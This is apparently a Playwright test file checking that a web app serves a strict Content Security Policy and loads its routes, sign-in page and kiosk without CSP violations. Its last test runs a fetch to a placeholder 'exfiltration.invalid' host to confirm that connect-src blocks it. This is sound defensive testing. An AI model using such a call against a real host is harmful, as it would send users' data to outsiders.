import { expect, test, type Page } from '@playwright/test';
import { ROUTES } from './support/acceptance-routes';

/**
 * Batch R2 (I1): every page is served with the Content Security Policy from
 * src/lib/security/page-headers.ts, and loading the app's major routes, the sign-in page and the
 * kiosk triggers no CSP violation (a blocked script, style, image, font or API call would be
 * reported by the browser as a `securitypolicyviolation` event).
 */

async function watchViolations(page: Page) {
  await page.addInitScript(() => {
    const store: string[] = [];
    (window as unknown as { __cspViolations: string[] }).__cspViolations = store;
    document.addEventListener('securitypolicyviolation', (event) => {
      store.push(`${event.violatedDirective} blocked ${event.blockedURI || '(inline)'}`);
    });
  });
  const consoleErrors: string[] = [];
  page.on('console', (message) => {
    if (message.type() === 'error' && /Content Security Policy/i.test(message.text())) {
      consoleErrors.push(message.text());
    }
  });
  return async () => [
    ...((await page.evaluate(
      () => (window as unknown as { __cspViolations?: string[] }).__cspViolations ?? [],
    )) as string[]),
    ...consoleErrors,
  ];
}

function expectProductionPolicy(policy: string | undefined) {
  expect(policy, 'Content-Security-Policy header').toBeTruthy();
  expect(policy).toContain("default-src 'self'");
  expect(policy).toContain("object-src 'none'");
  expect(policy).toContain("frame-ancestors 'none'");
  expect(policy).not.toContain('unsafe-eval');
}

test.describe('Content Security Policy (Batch R2)', () => {
  // `next dev` sends the development policy (with 'unsafe-eval' for React Refresh); these checks
  // are about the production policy, which the default `next build` + `next start` run serves.
  test.skip(
    process.env.PLAYWRIGHT_DEV_SERVER === '1',
    'The production Content Security Policy is only served by a production build.',
  );

  for (const route of ROUTES) {
    test(`[${route.area}] ${route.path}: served with the policy and loads without a violation`, async ({
      page,
    }) => {
      await route.setup(page);
      const violations = await watchViolations(page);
      const response = await page.goto(route.path);
      expectProductionPolicy(response?.headers()['content-security-policy']);
      expect(response?.headers()['x-content-type-options']).toBe('nosniff');
      await expect(route.ready(page)).toBeVisible();
      expect(await violations()).toEqual([]);
    });
  }

  test('the sign-in page and the kiosk load without a violation and keep their private headers', async ({
    page,
  }) => {
    const violations = await watchViolations(page);
    const login = await page.goto('/login');
    expectProductionPolicy(login?.headers()['content-security-policy']);
    expect(login?.headers()['cache-control']).toBe('no-store');
    expect(login?.headers()['referrer-policy']).toBe('no-referrer');
    await expect(page.getByRole('heading', { level: 1 })).toBeVisible();

    const kiosk = await page.goto('/kiosk');
    expectProductionPolicy(kiosk?.headers()['content-security-policy']);
    expect(kiosk?.headers()['permissions-policy']).toBe('camera=(), microphone=(), geolocation=()');
    await page.waitForLoadState('networkidle');
    expect(await violations()).toEqual([]);
  });

  test('a cross-origin request outside the API is blocked by connect-src', async ({ page }) => {
    const violations = await watchViolations(page);
    await page.goto('/login');
    await page.evaluate(async () => {
      await fetch('https://exfiltration.invalid/collect').catch(() => undefined);
    });
    // The browser reports the block as a securitypolicyviolation event and in the console.
    await expect
      .poll(violations)
      .toEqual(
        expect.arrayContaining([
          expect.stringContaining('connect-src blocked https://exfiltration.invalid'),
        ]),
      );
  });
});
